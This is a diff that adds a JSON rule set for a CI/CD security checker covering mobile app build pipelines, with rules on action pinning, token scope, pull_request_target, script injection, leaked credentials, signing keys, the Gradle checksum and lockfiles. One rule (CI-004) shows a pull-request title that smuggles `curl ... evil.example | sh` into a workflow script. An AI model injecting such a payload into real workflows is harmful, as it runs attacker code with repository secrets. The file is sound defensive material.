@@ -1,0 +1,166 @@
+{
+  "rules": [
+    {
+      "id": "CI-001",
+      "title": "Third-party action is pinned to a tag or branch, not a commit SHA",
+      "platform": "ci",
+      "severity": "high",
+      "profiles": ["L1"],
+      "why": "A tag or branch is a label the action's owner can move to different code. In the tj-actions and Trivy attacks, moved tags ran stolen-secret code inside thousands of workflows that never changed a line.",
+      "fix": "Replace the tag with the full 40-character commit SHA and keep the version in a trailing comment. Let a tool such as `pinact run` write the pin, and let Dependabot (with a cooldown) keep it current.",
+      "verify": "Run `pinact run --check` or zizmor's `unpinned-uses` audit: every remote `uses:` should end in a 40-character SHA.",
+      "effort": "minutes",
+      "book": "§15.3",
+      "book_url": "https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#153-hardening-the-workflow",
+      "mastg": [],
+      "fix_code": {
+        "lang": "yaml",
+        "code": "- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1"
+      },
+      "confidence": "high",
+      "detector": "ci_unpinned_action"
+    },
+    {
+      "id": "CI-002",
+      "title": "Workflow token permissions are not restricted",
+      "platform": "ci",
+      "severity": "medium",
+      "profiles": ["L1"],
+      "why": "Every run gets a GITHUB_TOKEN. Without a `permissions:` block it gets the repository default, which is read-write on many older organizations, so any hijacked step can push code or change releases.",
+      "fix": "Add `permissions: {}` at the top of the workflow so the token can do nothing, then grant each job only what it needs. Never use `write-all`.",
+      "verify": "Open a run's \"Set up job\" log and check the GITHUB_TOKEN permissions list matches what the job needs.",
+      "effort": "minutes",
+      "book": "§15.3",
+      "book_url": "https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#153-hardening-the-workflow",
+      "mastg": [],
+      "fix_code": {
+        "lang": "yaml",
+        "code": "permissions: {}          # workflow level: deny everything\njobs:\n  build:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read     # job level: only what this job needs"
+      },
+      "confidence": "high",
+      "detector": "ci_token_permissions"
+    },
+    {
+      "id": "CI-003",
+      "title": "pull_request_target workflow checks out the pull request's code",
+      "platform": "ci",
+      "severity": "critical",
+      "profiles": ["L1"],
+      "why": "`pull_request_target` runs with your secrets and a write token even for pull requests from forks. Checking out and building the fork's code hands both to whoever opened the pull request, as happened to Ultralytics, Nx, and TanStack.",
+      "fix": "Use `pull_request` for anything that builds or tests contributed code. If you need `pull_request_target`, never check out or run the fork's code in that job, and never let it write a cache or artifact another workflow uses.",
+      "verify": "Search the workflow for `pull_request_target` and confirm no job in it checks out `github.event.pull_request.head.*` or runs `gh pr checkout`.",
+      "effort": "hours",
+      "book": "§15.3",
+      "book_url": "https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#153-hardening-the-workflow",
+      "mastg": [],
+      "fix_code": {
+        "lang": "yaml",
+        "code": "on:\n  pull_request:          # fork code runs with a read-only token and no secrets\n\npermissions: {}\njobs:\n  test:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n        with:\n          persist-credentials: false\n      - run: ./gradlew assembleDebug"
+      },
+      "confidence": "high",
+      "detector": "ci_prt_checkout"
+    },
+    {
+      "id": "CI-004",
+      "title": "Untrusted event text is pasted into a run script",
+      "platform": "ci",
+      "severity": "high",
+      "profiles": ["L1"],
+      "why": "GitHub replaces `${{ }}` before the shell runs, so a pull request title, issue body, or branch name becomes part of your script. A title such as `x\"; curl evil | sh` then runs as your workflow, with its token and secrets.",
+      "fix": "Pass the value through `env:` and read it as a quoted shell variable, so it stays data.",
+      "verify": "Run zizmor (`template-injection` audit) or actionlint; no `run:` block should expand attacker-controlled fields (titles, bodies, branch names, commit messages, `github.head_ref`) directly.",
+      "effort": "minutes",
+      "book": "§15.3",
+      "book_url": "https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#153-hardening-the-workflow",
+      "mastg": [],
+      "fix_code": {
+        "lang": "yaml",
+        "code": "# Wrong: a PR titled   x\"; curl -s https://evil.example | sh; echo \"   runs as your script\n- run: echo \"Checking ${{ github.event.pull_request.title }}\"\n\n# Right: pass it as data through the environment, and quote it\n- env:\n    PR_TITLE: ${{ github.event.pull_request.title }}\n  run: echo \"Checking $PR_TITLE\""
+      },
+      "confidence": "high",
+      "detector": "ci_script_injection"
+    },
+    {
+      "id": "CI-005",
+      "title": "actions/checkout leaves the job token on disk",
+      "platform": "ci",
+      "severity": "medium",
+      "profiles": ["L1"],
+      "why": "By default `actions/checkout` leaves the job token in the workspace's git config (from v6, in a credentials file under `$RUNNER_TEMP` that `.git/config` includes). Every later step, including third-party actions and build scripts, can read it, and with older versions an uploaded artifact of the workspace can leak it.",
+      "fix": "Set `persist-credentials: false` on every checkout. Only a job that pushes back to the repository needs the token, and it can pass it explicitly to that one command.",
+      "verify": "In a test run, add a step `git config --get-regexp 'http.*extraheader'`; it should print nothing. zizmor's `artipacked` audit also flags checkouts that keep credentials.",
+      "effort": "minutes",
+      "book": "§15.3",
+      "book_url": "https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#153-hardening-the-workflow",
+      "mastg": [],
+      "fix_code": {
+        "lang": "yaml",
+        "code": "- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n  with:\n    persist-credentials: false   # don't leave the token on disk for later steps"
+      },
+      "confidence": "medium",
+      "detector": "ci_persist_credentials"
+    },
+    {
+      "id": "CI-006",
+      "title": "Signing key or signing password is committed to the repository",
+      "platform": "ci",
+      "severity": "critical",
+      "profiles": ["L1"],
+      "why": "Anyone who can read the repository, or any of its forks and clones, can sign builds as you. Deleting the file later doesn't help: it stays in git history.",
+      "fix": "Rotate first: request an upload key reset in Play Console, or revoke the certificate or API key. Then remove the file from history, store the keystore base64-encoded in the CI secret store, decode it at build time, and read passwords from environment variables.",
+      "verify": "Run `git log --all -- '*.jks' '*.keystore' '*.p12' '*.p8' key.properties` and confirm nothing comes back after the history rewrite.",
+      "effort": "hours",
+      "book": "§15.6",
+      "book_url": "https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#156-signing-keys-and-release-integrity",
+      "mastg": [],
+      "fix_code": {
+        "lang": "kotlin",
+        "code": "// app/build.gradle.kts\nval uploadKeystore: String? = System.getenv(\"UPLOAD_KEYSTORE_PATH\")\n\nandroid {\n    signingConfigs {\n        create(\"release\") {\n            if (uploadKeystore != null) {\n                storeFile = file(uploadKeystore)\n                storePassword = System.getenv(\"UPLOAD_KEYSTORE_PASSWORD\")\n                keyAlias = System.getenv(\"UPLOAD_KEY_ALIAS\")\n                keyPassword = System.getenv(\"UPLOAD_KEY_PASSWORD\")\n            }\n        }\n    }\n}"
+      },
+      "confidence": "high",
+      "detector": "ci_signing_material"
+    },
+    {
+      "id": "CI-007",
+      "title": "Gradle wrapper download is not checked against a SHA-256",
+      "platform": "ci",
+      "severity": "low",
+      "profiles": ["L1"],
+      "why": "Without `distributionSha256Sum`, the wrapper runs whatever Gradle distribution the download URL returns. A swapped distribution runs with full access to your build and its signing secrets.",
+      "fix": "Add `distributionSha256Sum` to `gradle/wrapper/gradle-wrapper.properties`, using the checksum published for that exact Gradle version. `./gradlew wrapper --gradle-version <v> --gradle-distribution-sha256-sum <sha>` writes it for you.",
+      "verify": "Change one character of the checksum and run `./gradlew help` on a clean machine: the download should fail verification.",
+      "effort": "minutes",
+      "book": "§15.4",
+      "book_url": "https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#154-dependencies-and-build-inputs",
+      "mastg": [],
+      "fix_code": {
+        "lang": "properties",
+        "code": "# gradle/wrapper/gradle-wrapper.properties\ndistributionUrl=https\\://services.gradle.org/distributions/gradle-<version>-bin.zip\ndistributionSha256Sum=<SHA-256 published at gradle.org/release-checksums for that file>"
+      },
+      "confidence": "high",
+      "detector": "ci_wrapper_checksum"
+    },
+    {
+      "id": "CI-008",
+      "title": "No dependency lockfile is committed",
+      "platform": "ci",
+      "severity": "info",
+      "profiles": ["L1"],
+      "why": "Without a lockfile, the same build file can resolve a different dependency version next month, including a malicious one, and nobody notices because no file changed.",
+      "fix": "Enable Gradle dependency locking and commit each module's `gradle.lockfile`. For Swift packages, commit `Package.resolved`. Libraries that others depend on may leave `Package.resolved` out on purpose.",
+      "verify": "Run `./gradlew dependencies --write-locks`, commit the result, and confirm a later build fails if a resolved version changes.",
+      "effort": "hours",
+      "book": "§15.4",
+      "book_url": "https://github.com/hossam9k/mobile-app-security/blob/main/book/06-the-build-and-release-pipeline.md#154-dependencies-and-build-inputs",
+      "maswe": "MASWE-0044",
+      "masvs": "MASVS-CODE-3",
+      "mastg": [],
+      "fix_code": {
+        "lang": "kotlin",
+        "code": "// build.gradle.kts (each module, or once in a convention plugin)\ndependencyLocking {\n    lockAllConfigurations()\n}"
+      },
+      "confidence": "manual",
+      "detector": "ci_missing_lockfile"
+    }
+  ]
+}
